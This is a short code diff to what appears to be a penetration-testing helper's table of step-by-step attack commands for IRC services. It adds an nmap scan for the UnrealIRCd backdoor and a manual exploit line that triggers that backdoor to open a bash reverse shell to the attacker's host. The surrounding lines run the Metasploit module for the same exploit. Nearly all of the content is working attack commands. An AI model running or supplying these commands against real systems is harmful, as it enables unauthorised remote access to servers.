@@ -5011,9 +5011,11 @@ _STEP_COMMANDS = {
     "irc": {
         1: [
             "nc -nv <RHOST> <RPORT>   # NICK x ; USER x x x x",
+            "nmap -sV -p<RPORT> --script irc-info,irc-unrealircd-backdoor <RHOST>",
         ],
         2: [
             "msfconsole -q -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS <RHOST>; run'",
+            "# manual backdoor (msf-less): nc <RHOST> <RPORT> then send:  AB; bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'",
         ],
         3: [
             "searchsploit unrealircd",
